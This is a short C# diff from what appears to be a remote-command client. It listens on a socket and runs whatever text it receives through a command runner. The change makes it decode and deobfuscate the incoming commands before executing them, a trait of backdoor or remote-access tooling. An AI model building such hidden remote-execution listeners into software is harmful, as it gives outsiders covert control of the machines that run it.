@@ -24,7 +24,6 @@ namespace Client
 
             Task t = Task.Factory.StartNew(listen);
 
-
             Console.ReadKey();
 
         }
@@ -37,7 +36,7 @@ namespace Client
             s.ReceiveFrom(data, ref ep);
             List<Byte> bytes = new List<Byte>(data);
             bytes.RemoveAll(b => b == 0);
-            Console.WriteLine(ch.runCommand(Encoding.ASCII.GetString(bytes.ToArray())));
+            Console.WriteLine(ch.runCommand(Encoding.UTF8.GetString(bytes.ToArray()).deobfuscate()));
             listen();
         }
 
